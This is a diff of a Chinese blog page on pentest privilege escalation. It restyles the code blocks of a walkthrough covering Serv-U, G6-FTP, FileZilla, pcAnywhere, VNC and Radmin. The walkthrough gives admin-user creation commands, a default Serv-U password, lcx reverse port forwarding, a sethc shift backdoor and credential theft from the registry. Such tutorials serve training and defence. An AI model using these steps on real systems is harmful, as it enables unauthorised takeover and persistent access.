@@ -417,27 +417,27 @@
 <p>3、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</p>
 <p>4、serv-u ftp转发端口</p>
 <h5 id="有修改权限"><a href="#有修改权限" class="headerlink" title="有修改权限"></a>有修改权限</h5><p>步骤如下：<br>1、判断是否安装serv-u<br>nmap扫端口确认<br>2、检查是否有可写权限<br>一般安装目录 c:\Program Files\Serv-u\SerUDaemon.ini<br>3、在serv-u中添加用户<br>在user4=添加一个系统用户</p>
-<pre><code>[USER=quan|1]                                //用户名
-Password=                        //用户密码加密后的密文
-HomeDir=c:\ftp\quan             //目录
-RelPaths=3 
-TimeOut=600                      //超时时间设置
-Maintenance=System               //权限
-Access1=C:\|RWAMELCDP            //可访问的目录及权限
-Access2=d:\|RWAMELCDP            //可访问的目录及权限
-Access3=e:\|RWAMELCDP            //可访问的目录及权限
-SKEYValues=</code></pre><p>password=2位随机字符+md5(2位随机字符+123456)</p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[USER=quan|<span class="number">1</span>]                                <span class="comment">//用户名</span></span><br><span class="line">Password=					    <span class="comment">//用户密码加密后的密文</span></span><br><span class="line">HomeDir=c:\ftp\quan             <span class="comment">//目录</span></span><br><span class="line">RelPaths=<span class="number">3</span> </span><br><span class="line">TimeOut=<span class="number">600</span>                      <span class="comment">//超时时间设置</span></span><br><span class="line">Maintenance=System               <span class="comment">//权限</span></span><br><span class="line">Access1=C:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">Access2=d:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">Access3=e:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">SKEYValues=</span><br></pre></td></tr></table></figure>
+
+<p>password=2位随机字符+md5(2位随机字符+123456)</p>
 <p>4、连接目标FTP服务器</p>
-<pre><code>ftp 目标IP地址 刚添加的用户密码</code></pre><p>5、利用ftp命令<code>quote site exec</code>添加用户加入administrators权限组</p>
-<pre><code>quote site exec net user quan quan123 /add
-quote site exec net localgroup administrators quan /add</code></pre><h5 id="无修改权限"><a href="#无修改权限" class="headerlink" title="无修改权限"></a>无修改权限</h5><p>1、利用md5 直接去解密<br>2、默认用户名密码<br>账户：LocalAdministrator ，密码：#l@$ak#.lk;0@P<br>命令：<br>cmd /c net user quan quan123 /add &amp; net localgroup administrators quan /add<br>3、不是默认密码时<br>直接把SerUAdmin.exe 下载下来<br>用winhex打开查找LocalAdministrator（选择ANSI字符）进行查找密码</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">ftp</span> 目标<span class="built_in">IP</span>地址 刚添加的用户密码</span><br></pre></td></tr></table></figure>
+
+<p>5、利用ftp命令<code>quote site exec</code>添加用户加入administrators权限组</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">quote site exec net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">quote site exec net localgroup administrators quan /add</span><br></pre></td></tr></table></figure>
+
+<h5 id="无修改权限"><a href="#无修改权限" class="headerlink" title="无修改权限"></a>无修改权限</h5><p>1、利用md5 直接去解密<br>2、默认用户名密码<br>账户：LocalAdministrator ，密码：#l@$ak#.lk;0@P<br>命令：<br>cmd /c net user quan quan123 /add &amp; net localgroup administrators quan /add<br>3、不是默认密码时<br>直接把SerUAdmin.exe 下载下来<br>用winhex打开查找LocalAdministrator（选择ANSI字符）进行查找密码</p>
 <h5 id="serv-u-ftp本地溢出权限提升-使用6-0以及以前版本"><a href="#serv-u-ftp本地溢出权限提升-使用6-0以及以前版本" class="headerlink" title="serv-u ftp本地溢出权限提升(使用6.0以及以前版本)"></a>serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</h5><p>步骤如下：<br>1、用Serv-U提权综合工具生成提权工具serv_u.exe<br>2、先上传 serv_u.exe 到一个盘符下<br>比如是d盘<br>3、执行命令</p>
-<pre><code>d:\serv_u.exe
-d:\serv_u.exe “net user quan quan123 /add”
-d:\serv_u.exe “net localgroup administrators quan /add” </code></pre><p>注意命令要有引号</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d:\serv_u.exe</span><br><span class="line">d:\serv_u.exe “net<span class="built_in"> user </span>quan quan123 /add”</span><br><span class="line">d:\serv_u.exe “net localgroup administrators quan /add”</span><br></pre></td></tr></table></figure>
+
+<p>注意命令要有引号</p>
 <h5 id="serv-u-ftp转发端口"><a href="#serv-u-ftp转发端口" class="headerlink" title="serv-u ftp转发端口"></a>serv-u ftp转发端口</h5><p>1、lcx端口转发<br>在目标Webshell上运行LCX命令</p>
-<pre><code>lcx -slave yourIP 5000 127.0.0.1 43958</code></pre><p>在本机上运行</p>
-<pre><code>lcx -listen 5000 21</code></pre><p>2、本机登陆Serv_U<br>打开本地的SERV_U 在IP上填入127.0.0.1<br>帐号写LocalAdministrator 密码#l@$ak#.lk;0@P</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -slave yourIP <span class="number">5000</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">43958</span></span><br></pre></td></tr></table></figure>
+
+<p>在本机上运行</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -<span class="section">listen</span> <span class="number">5000</span> <span class="number">21</span></span><br></pre></td></tr></table></figure>
+
+<p>2、本机登陆Serv_U<br>打开本地的SERV_U 在IP上填入127.0.0.1<br>帐号写LocalAdministrator 密码#l@$ak#.lk;0@P</p>
 <p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99692269" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99692269</a></p>
 <p>这里就不写具体过程了</p>
 <h4 id="第三方软件G6-FTP提权"><a href="#第三方软件G6-FTP提权" class="headerlink" title="第三方软件G6-FTP提权"></a>第三方软件G6-FTP提权</h4><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%89%5CQQ%E6%88%AA%E5%9B%BE20200429095652.png" alt=""></p>
@@ -456,7 +456,9 @@ d:\serv_u.exe “net localgroup administrators quan /add” </code></pre><p>注�
 <li><p>利用<code>lcx</code>端口转发 默认只允许本机连接</p>
 </li>
 </ul>
-<pre><code>lcx.exe -tran 8027 127.0.0.1 8021</code></pre><ul>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">8027</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8021</span></span><br></pre></td></tr></table></figure>
+
+<ul>
 <li><p>以管理员用户登录服务端<br>转发成功后，通过<code>G6-FTP</code>软件进行连接，以管理员用户登入</p>
 </li>
 <li><p>创建FTP用户并进行权限设置</p>
@@ -464,8 +466,9 @@ d:\serv_u.exe “net localgroup administrators quan /add” </code></pre><p>注�
 <li><p>上传批处理文件<br><code>adduser.bat</code>中的文件内容为：即新建一个用户名为<code>quan</code>的用户，并且加入到管理员组中。</p>
 </li>
 </ul>
-<pre><code>net user quan quan123 /add
-net localgroup administrators quan /add</code></pre><ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">net localgroup administrators quan /add</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li><p>在G6-FTP软件中加入批处理命令<br>site commands-&gt; +<br>Command:ADDUSER<br>Excute:</p>
 </li>
 <li><p>普通用户登录ftp</p>
@@ -474,8 +477,9 @@ net localgroup administrators quan /add</code></pre><ul>
 </li>
 </ul>
 <h5 id="通过执行bat文件提权-1"><a href="#通过执行bat文件提权-1" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>可用性较差<br>步骤如下<br>1、以非特权用户登录<br>2、通过添加FTP用户账户hhh<br>3、对FTP服务器添加新的site命令<br>4、新建a.bat文件</p>
-<pre><code>net user quan quan123 /add
-net localgroup administrators quan /add</code></pre><p>5、将a.bat文件映射到新建的site命令</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">net localgroup administrators quan /add</span><br></pre></td></tr></table></figure>
+
+<p>5、将a.bat文件映射到新建的site命令</p>
 <p>6、获取system权限<br>以test用户登录ftp服务器，执行以下命令<br>ftp&gt;quote site a</p>
 <h4 id="第三方软件FileZilla提权"><a href="#第三方软件FileZilla提权" class="headerlink" title="第三方软件FileZilla提权"></a>第三方软件FileZilla提权</h4><h5 id="FileZilla简介"><a href="#FileZilla简介" class="headerlink" title="FileZilla简介"></a>FileZilla简介</h5><ul>
 <li>FileZilla是一个免费开源的FTP软件，分为客户端版本和服务器版本，具备所有的FTP软件功能。</li>
@@ -484,14 +488,17 @@ net localgroup administrators quan /add</code></pre><p>5、将a.bat文件映射�
 <h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>1、下载这两个文件，拿到管理密码</p>
 <p>2、查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p>
 <p>3、利用<code>lcx</code>端口转发 默认只允许本机连接</p>
-<pre><code>lcx.exe -tran 14148 127.0.0.1 14147</code></pre><p>4、以管理员用户远程登录服务端程序<br>转发成功后，通过<code>FileZilla</code>软件进行连接，以管理员用户登入<br>端口为14148，密码默认为空</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">14148</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">14147</span></span><br></pre></td></tr></table></figure>
+
+<p>4、以管理员用户远程登录服务端程序<br>转发成功后，通过<code>FileZilla</code>软件进行连接，以管理员用户登入<br>端口为14148，密码默认为空</p>
 <p>5、创建ftp用户并进行权限设置<br>赋予C盘读写权限</p>
 <p>6、用刚创建的用户通过FileZilla的客户端登录ftp</p>
 <p>7、使用<code>cmd.exe</code>改名为<code>sethc.exe</code>替换<code>C:\Windows\System32\sethc.exe</code>生成shift后门</p>
 <p>8、远程登录<code>3389</code>,按<code>5</code>次shift调出<code>cmd.exe</code></p>
 <p>9、添加一个用户，并将其提升为管理员权限</p>
-<pre><code>net user quan 123 /add
-net localgroup administrator quan /add</code></pre><h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>​     FTP分为主动连接和被动连接，Filezilla的21端口是不能被转发出来的，将21端口转发出来以后，被动连接就会变成主动连接，Filezilla是不支持主动连接的。将21端口转发出来以后就会发生积极拒绝的情况。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan 123 /add</span><br><span class="line">net localgroup administrator quan /add</span><br></pre></td></tr></table></figure>
+
+<h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>​     FTP分为主动连接和被动连接，Filezilla的21端口是不能被转发出来的，将21端口转发出来以后，被动连接就会变成主动连接，Filezilla是不支持主动连接的。将21端口转发出来以后就会发生积极拒绝的情况。</p>
 <p>​    2008系统权限比2003严格一点，导致系统文件是不能修改和删除重命名，这里是没有办法利用 。如果遇到不能提权的时候，可以使用如下几种提权思路。</p>
 <h5 id="扩展知识："><a href="#扩展知识：" class="headerlink" title="扩展知识："></a>扩展知识：</h5><ol>
 <li>通过FTP去篡改他桌面上快捷方式，路径指向给修改到我们的恶意程序。（比较被动）不推荐</li>
@@ -513,14 +520,20 @@ net localgroup administrator quan /add</code></pre><h5 id="补充："><a href="#
 </ul>
 <p><strong>2、提权步骤</strong></p>
 <p>（1）访问pcAnywhere默认安装目录，查找<code>cif</code>文件并下载<br>默认路径： C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts</p>
-<pre><code>dir *.cif/s</code></pre><p>（2）利用破解工具<code>pcAnywherePWD</code>对<code>cif</code>文件直接进行破解</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dir</span> <span class="regexp">*.cif</span>/s</span><br></pre></td></tr></table></figure>
+
+<p>（2）利用破解工具<code>pcAnywherePWD</code>对<code>cif</code>文件直接进行破解</p>
 <p>（3）连接pcAnywhere服务端<br>拿到用户密码后使用客户端连接对pcAnywhere服务端进行连接，之后就和对本地计算机进行操作一样。</p>
 <p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99699638" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99699638</a></p>
 <h4 id="第三方软件VNC提权"><a href="#第三方软件VNC提权" class="headerlink" title="第三方软件VNC提权"></a>第三方软件VNC提权</h4><h5 id="VNC简介"><a href="#VNC简介" class="headerlink" title="VNC简介"></a>VNC简介</h5><p>VNC (Virtual Network Console)是虚拟网络控制台的缩写。它 是一款优秀的远程控制工具软件，由著名的 AT&amp;T 的欧洲研究实验室开发的。</p>
 <h5 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h5><p>安装VNC后会<code>在注册表中保留VNC的密码</code>，通过WEBSHELL远程读取注册表中的密码信息并在本地破解VNC密码进行远程连接来达到提权目的。</p>
 <h5 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h5><p><strong>1、通过读取注册表十进制数</strong><br>（1）RealVNC的注册表路径：</p>
-<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\Password</code></pre><p>（2）UltraVNC的注册表路径：</p>
-<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Default\password</code></pre><p><strong>2、转换成十六进制数</strong><br>在线转换进制地址链接：<a href="https://www.toolfk.com/tool-convert-hexadecimal" target="_blank" rel="noopener">https://www.toolfk.com/tool-convert-hexadecimal</a></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\R</span>ealVNC<span class="symbol">\W</span>inVNC4<span class="symbol">\P</span>assword</span><br></pre></td></tr></table></figure>
+
+<p>（2）UltraVNC的注册表路径：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\O</span>RL<span class="symbol">\W</span>inVNC3<span class="symbol">\D</span>efault<span class="symbol">\p</span>assword</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、转换成十六进制数</strong><br>在线转换进制地址链接：<a href="https://www.toolfk.com/tool-convert-hexadecimal" target="_blank" rel="noopener">https://www.toolfk.com/tool-convert-hexadecimal</a></p>
 <p><strong>3、破解十六进制数得到密码</strong><br>使用工具VNC4X进行破解<br>先在CMD输入<code>vncx4.exe -W</code>回车<br>然后将转换后的十六进制挨个输入，每输入一个都按一次回车</p>
 <p><strong>4、使用获取到的账号密码连接vnc</strong><br>通过本地的VNC客户端，连接成功后远程操作实现提权</p>
 <p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99711913" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99711913</a></p>
@@ -531,8 +544,9 @@ net localgroup administrator quan /add</code></pre><h5 id="补充："><a href="#
 </ul>
 <h5 id="提权思路-1"><a href="#提权思路-1" class="headerlink" title="提权思路"></a>提权思路</h5><p>老版本的Radmin会<code>在注册表中保留密码的Hash值</code>，通过WEBSHELL、远程挂马读取注册表中的密码Hash值并在本地破解密码进行远程连接来达到提权目的。</p>
 <h5 id="提取步骤"><a href="#提取步骤" class="headerlink" title="提取步骤"></a>提取步骤</h5><p><strong>1、获取MD5Hash值</strong></p>
-<pre><code>HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParametersParameter//默认密码注册表位置
-HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParametersPort //默认端口注册表位置</code></pre><p><strong>2、使用RadminHash进行登录</strong><br>在<code>Radmin-Hash</code>客户端输入RAdmin客户端的Hash值即可登录。<br>然后在Radmin-Hash客户端新建服务端，输入所要连接的<code>IP</code>或者扫描存活主机进行连接</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINESYSTEMRAdminv2<span class="number">.0</span>ServerParametersParameter<span class="comment">//默认密码注册表位置</span></span><br><span class="line">HKEY_LOCAL_MACHINESYSTEMRAdminv2<span class="number">.0</span>ServerParametersPort <span class="comment">//默认端口注册表位置</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>2、使用RadminHash进行登录</strong><br>在<code>Radmin-Hash</code>客户端输入RAdmin客户端的Hash值即可登录。<br>然后在Radmin-Hash客户端新建服务端，输入所要连接的<code>IP</code>或者扫描存活主机进行连接</p>
 <p><strong>3、查看远程屏幕</strong></p>
 <p>在Radmin客户端选择屏幕控制，输入Hash值即可查看远程主机屏幕。</p>
 <p><strong>4、获取并破解密码</strong><br>用mimikatz解析用户密码，也可以通过上传getpw.exe文件获取用户的sam值，再通过LC5解密。</p>
